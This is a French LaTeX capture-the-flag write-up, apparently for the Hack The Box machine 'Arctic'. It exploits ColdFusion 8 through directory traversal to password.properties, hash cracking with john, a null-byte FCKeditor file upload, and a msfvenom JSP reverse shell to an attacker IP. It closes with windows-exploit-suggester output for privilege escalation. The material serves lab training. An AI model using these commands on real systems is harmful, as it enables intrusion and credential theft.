\chapter{Artic}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: coldfusion 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC -oX nmap.xml 10.10.10.11
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-02 12:09 CEST
Nmap scan report for 10.10.10.11
Host is up (0.040s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
\end{verbatim}

\subsubsection{msrpc}

rpcdump monte bien des truc mais on ne peut pas y aller en null session.

\subsubsection{8500}
bon telnet, nc ne donnent rien. On ne trouve pas grand chose sur le Flight
Message Transfer Protocol

recherche google (fmtp port 8500) on a cela
\verb+https://www.speedguide.net/port.php?port=8500+

qui montre que l'on peut avoir du serveur web 
\begin{verbatim}
$ curl http://10.10.10.11:8500
<html>
<head>
<title>Index of /</title></head><body bgcolor="#ffffff">
<h1>Index of /</h1><br><hr><pre><a href="CFIDE/">CFIDE/</a>               <i>dir</i>   03/22/17 08:52 μμ
<a href="cfdocs/">cfdocs/</a>              <i>dir</i>   03/22/17 08:55 μμ
</pre><hr></html>
\end{verbatim}

On a des fichiers .cfm  et en recherchant cfide on trouve 
\begin{verbatim}
 The "/CFIDE" (or "ColdFusion Integrated Development Environment") directory
 was the designated location for this administrator and development
 environment.
 \end{verbatim}

 on doit peut être pouvoir y trouver des credentials.

\begin{verbatim}
$ sudo nmap  --script +http-adobe-coldfusion-apsa1301 
--script-args basepath=/CFDI/adminapi/ -p8500 -Pn -vvv 10.10.10.11
\end{verbatim}
Ne marche pas

on navigue sur le site:
\verb+http://10.10.10.11:8500/CFIDE/administrator/enter.cfm+ avec comme info
login\verb+admin+ coldfusion 8

\url{https://nets.ec/Coldfusion_hacking}

\vegin{verbatim}
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en
\end{verbatim}


\begin{verbatim}
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
</p>
\end{verbatim}


\begin{verbatim}
$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt cf.hash --format=Raw-SHA1-AxCrypt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1-AxCrypt [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
happyday         (?)
\end{verbatim}


procedure pour upload un revershell:

\begin{verbatim}
Writing Shell to File

    Go to the Settings Summary tab on the left and find the 'Mappings' section.
    One of the default mappings is /CFIDE. This is where you will be writing to.
    Copy the path next to it.
    Enter the Debugging and Logging tab on the left panel and click 'Scheduled Tasks'
    Click 'Schedule New Task'.
    Set the task name to whatever you like
    Change the URL to the URL of a plaintext CFM shell
(dans notre cas un reverse crafté avec msfvenom -p java/jsp_shell_reverse_tcp)
(et hosté en  http://10.10.16.3/shell.jsp)
    Check the option to save the output to a file.
    Paste the path you acquired from the Mappings into the 'File' field,
    Type the name you want to save the shell as and the extension (cfm).
(Dans notre cas ca donne c:\ColdFusion8\wwwroot\CFIDE\shell.jsp)
    Press OK and click the green check to run the task.

If everything went as expected, your shell should now be on the server at /CFIDE/shellname.cfm.
\end{verbatim}

Donc on craft un reverseshell avec msfvenom.


\begin{verbatim}
$ searchsploit coldfusion 8

ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit) 
\end{verbatim}

Ne passe pas à cause de la latence.

Donc 2 solutions soit on le joue à travers de burp pour choper la requete soit
on lit le code et on exec à la main.

\begin{verbatim}
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f raw > shell.jsp


$ curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 
    'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'

$ rlwrap nc -lnvp 4444
$ curl 'http://10.10.10.11:8500/userfiles/file/shell.jsp'
\end{verbatim}

\subsection{Foothold}
\subsubsection{x}

\begin{verbatim}
C:\ColdFusion8\runtime\bin>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45
System Boot Time:          3/10/2022, 9:06:25
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 4.839 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.008 MB
Virtual Memory: In Use:    1.277 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
\end{verbatim}

Pas de patch donc on va checker windows-exploit-suggester

\begin{verbatim}
 windows-exploit-suggester --update
[*] initiating winsploit version 3.3...
[+] writing to file 2022-10-04-mssb.xls
[*] done
 windows-exploit-suggester --database ./2022-10-04-mssb.xls --systeminfo ./systeminfo.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

\end{verbatim}


On recraft un revershell meterpreter que l'on va pouvoir upload pour avoir
acces à metasploit et executer un truc en auto

ce65ceee66b2b5ebaff07e50508ffb90

\section{Theorie}


